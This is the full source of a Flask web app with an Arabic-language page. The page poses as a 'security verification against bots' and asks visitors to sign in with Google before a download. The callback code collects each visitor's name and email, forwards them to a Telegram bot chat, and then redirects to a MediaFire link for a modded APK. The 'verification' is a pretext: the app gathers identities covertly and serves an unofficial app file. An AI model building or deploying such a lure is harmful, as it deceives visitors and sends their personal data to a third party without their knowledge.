import os
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

GOOGLE_CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID")
GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
REDIRECT_URI = "https://samer-production.up.railway.app/auth/callback"

MEDIAFIRE_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"


@app.route("/")
def home():
  google_login_url = (
      f"https://accounts.google.com/o/oauth2/v2/auth?client_id={GOOGLE_CLIENT_ID}"
      f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=email%20profile"
  )

  return render_template_string(f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني - حماية الموقع</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
        body {{ 
            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            width: 100vw; 
            padding: 20px; 
        }}
        .box {{ 
            background: #1e293b; 
            width: 100%; 
            max-width: 410px; 
            padding: 40px 30px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4); 
            text-align: center; 
            border: 1px solid #334155; 
        }}
        .icon-container {{
            width: 70px;
            height: 70px;
            background: rgba(59, 130, 246, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }}
        .icon {{ font-size: 32px; }}
        h2 {{ color: #f8fafc; font-size: 20px; font-weight: 700; margin-bottom: 12px; }}
        p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }}
        
        .google-btn {{ 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 12px; 
            width: 100%; 
            background: #ffffff; 
            color: #1e293b; 
            border: none; 
            border-radius: 8px; 
            padding: 14px 16px; 
            font-size: 15px; 
            font-weight: 600; 
            text-decoration: none; 
            cursor: pointer; 
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }}
        .google-btn:hover {{ 
            background: #f1f5f9; 
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(0,0,0,0.2);
        }}
        .google-icon {{ width: 20px; height: 20px; }}
        .footer {{ margin-top: 25px; font-size: 12px; color: #64748b; }}
    </style>
</head>
<body>
    <div class="box">
        <div class="icon-container">
            <div class="icon">🛡️</div>
        </div>
        <h2>التحقق من الأمان مطلوب</h2>
        <p>يرجى إثبات أنك استخدمت متصفحًا حقيقيًا وليس برنامج روبوت لمتابعة التنزيل بأمان.</p>
        
        <a href="{google_login_url}" class="google-btn">
            <svg class="google-icon" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
                <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.19v3.15C3.17 21.31 7.23 24 12 24z"/>
                <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.19C.43 8.13 0 9.87 0 12s.43 3.87 1.19 5.4l4.08-3.16z"/>
                <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.17 2.69 1.19 6.6l4.08 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/>
            </svg>
            <span>المتابعة باستخدام حساب Google</span>
        </a>
        <div class="footer">حماية متقدمة ضد الروبوتات والسبام</div>
    </div>
</body>
</html>
""")


@app.route("/auth/callback")
def auth_callback():
  try:
    code = request.args.get("code")
    if code:
      token_url = "https://oauth2.googleapis.com/token"
      payload = {
          "code": code,
          "client_id": GOOGLE_CLIENT_ID,
          "client_secret": GOOGLE_CLIENT_SECRET,
          "redirect_uri": REDIRECT_URI,
          "grant_type": "authorization_code",
      }

      response = requests.post(token_url, data=payload, timeout=10)

      if response.status_code == 200:
        token_data = response.json()
        access_token = token_data.get("access_token")

        if access_token:
          user_info_resp = requests.get(
              "https://www.googleapis.com/oauth2/v2/userinfo",
              headers={"Authorization": f"Bearer {access_token}"},
              timeout=10,
          )

          if user_info_resp.status_code == 200:
            user_info = user_info_resp.json()
            email = user_info.get("email", "غير معروف")
            name = user_info.get("name", "مستخدم جديد")

            if BOT_TOKEN and CHAT_ID:
              msg = f"🛡️ تم اجتياز التحقق الأمني بنجاح!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
              telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
              requests.post(
                  telegram_url,
                  json={"chat_id": CHAT_ID, "text": msg},
                  timeout=5,
              )
  except Exception as e:
    print(f"Error: {e}")

  return redirect(MEDIAFIRE_URL)


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
